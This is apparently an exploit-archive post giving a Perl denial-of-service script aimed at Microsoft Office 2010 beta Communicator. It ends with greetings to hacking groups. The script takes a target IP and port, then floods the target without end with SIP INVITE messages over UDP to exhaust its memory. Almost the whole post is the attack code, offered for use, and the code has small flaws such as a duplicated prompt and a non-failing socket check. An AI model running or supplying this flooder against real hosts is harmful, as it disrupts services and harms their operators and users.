========================================================================================                  
| # Title    : Microsoft Office ( 2010 beta ) Communicator SIP denial of service Exploit       
| # Author   : indoushka                                                               
| # email    : indoushka@hotmail.com                                                   
| # Home     : www.iqs3cur1ty.com/vb                                                                                                                                                                                         
| # Tested on: windows SP2        
| # Bug      : Denial of service Exploit                                                                      
======================      Exploit By indoushka       =================================
 # Exploit  : 
 
#!usr/bin/perl  
####################################################################################################################### 
#    Microsoft Office 2010 Communicator allows remote attack to cause a denial of service (memory consumption) via    #
#    a large number of SIP INVITE requests.                                                                           # 
####################################################################################################################### 
  
  
use IO::Socket; 
  
print("\nEnter IP Address of Target Server: \n"); 
$vuln_host_ip = <STDIN>; 
print("\nEnter IP Address of Target Server: \n"); 
$port = <STDIN>; 
  
$sock_sip = IO::Socket::INET->new(    PeerAddr => $vuln_host_ip, 
                                     PeerPort => $port, 
                                     Proto    => 'udp') || "Unable to create Socket"; 
#if the server is configured on TCP replace 'udp' with 'tcp'. 
  
while(1) 
{ 
print $sock_sip "INVITE sip:arpman.malicious.com SIP/2.0\r\nVia: SIP/2.0/UDP 172.16.16.4;branch=123-4567-900\r\n"; 
   
} 
  
#program never comes here for execution 

close($sock_sip);

Dz-Ghost Team ===== Saoucha * Star08 * Redda * Silitoad * XproratiX * onurozkan * n2n * ========================
Greetz : 
Exploit-db Team : 
(loneferret+Exploits+dookie2000ca)
all my friend :
His0k4 * Hussin-X * Rafik (www.Tinjah.com) * Yashar (www.sc0rpion.ir) SoldierOfAllah (www.m4r0c-s3curity.cc)
Stake (www.v4-team.com) * r1z (www.sec-r1z.com) * D4NB4R (http://www.ilegalintrusion.net/foro/)
Cyb3r IntRue (avengers team) * The globin * Virus_Hima
---------------------------------------------------------------------------------------------------------------
